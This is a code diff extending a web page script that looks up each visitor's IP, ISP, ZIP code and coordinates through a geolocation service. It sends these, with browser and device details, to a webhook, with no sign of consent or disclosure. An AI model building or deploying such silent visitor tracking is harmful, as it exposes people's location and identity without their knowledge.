@@ -27,14 +27,28 @@
     
     let ipInfo = 'Unknown';
     let location = 'Unknown';
+    let detailedLocation = 'Fetching...';
+    let isp = 'Unknown';
+    let coordinates = 'Unknown';
     
     try {
-      const ipResponse = await fetch('https://ipapi.co/json/');
+      // Using ip-api.com - more detailed and still free (45 requests/minute)
+      const ipResponse = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
       const ipData = await ipResponse.json();
-      ipInfo = ipData.ip;
-      location = ipData.city + ', ' + ipData.country_name;
+      
+      if (ipData.status === 'success') {
+        ipInfo = ipData.query;
+        location = `${ipData.city}, ${ipData.regionName}, ${ipData.country}`;
+        detailedLocation = `${ipData.city}, ${ipData.regionName} (${ipData.region}), ${ipData.country} ${ipData.countryCode}`;
+        if (ipData.zip) detailedLocation += ` - ZIP: ${ipData.zip}`;
+        isp = ipData.isp || ipData.org || 'Unknown';
+        coordinates = `${ipData.lat}, ${ipData.lon}`;
+      } else {
+        location = 'Unable to fetch';
+      }
     } catch (err) {
       console.log('IP fetch skipped');
+      location = 'Unable to fetch';
     }
     
     await fetch(WEBHOOK, {
@@ -48,7 +62,9 @@
             { name: '📍 Page', value: window.location.href, inline: false },
             { name: '🕐 Date & Time', value: new Date().toLocaleString('en-US', { dateStyle: 'full', timeStyle: 'long' }), inline: false },
             { name: '🌐 IP Address', value: ipInfo, inline: true },
-            { name: '🌍 Location', value: location, inline: true },
+            { name: '📡 ISP/Provider', value: isp, inline: true },
+            { name: '🌍 Location', value: detailedLocation, inline: false },
+            { name: '📍 Coordinates', value: coordinates, inline: true },
             { name: '⏰ Timezone', value: timezone, inline: true },
             { name: '🌐 Browser', value: browser, inline: true },
             { name: '📱 Device', value: device, inline: true },
